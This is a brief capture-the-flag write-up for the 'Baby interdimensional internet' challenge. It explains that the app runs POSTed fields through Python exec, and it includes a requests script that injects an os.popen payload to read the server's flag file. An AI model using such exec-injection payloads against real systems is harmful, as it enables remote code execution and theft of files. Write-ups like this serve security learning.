# Baby interdimensional internet

The application allows the user to POST `ingredient` & `measurements` strings that are later evaluated by `exec`. 
It's possible to craft a payload that reads the flag on the server. I had some issues with the server returning an empty body at first.
I think it was because I sent numeric values as the `ingredient` var.

```python
import requests

url = "http://46.101.2.216:32345"
data = {'ingredient': 'whatever', 'measurements': '__import__("os").popen("cat flag").read()'}

res = requests.post(url, data=data)

print(res.content)
```
